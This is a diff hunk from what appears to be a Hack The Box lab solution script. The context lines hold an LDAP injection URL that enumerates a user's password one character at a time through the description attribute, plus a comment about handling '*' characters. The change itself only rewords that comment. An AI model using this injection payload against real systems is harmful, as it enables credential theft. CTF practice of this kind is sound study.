@@ -10,7 +10,7 @@ if not charset_path:
 
 base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*>
 #If the enumeration gets to the point, when it discovers a * symbol in the password, it will enter into infinite loop, 
-#so add a found characters in found_chars string
+#so add a found characters in found_chars string, to avoid it from happening
 found_chars = ""
 
 try:
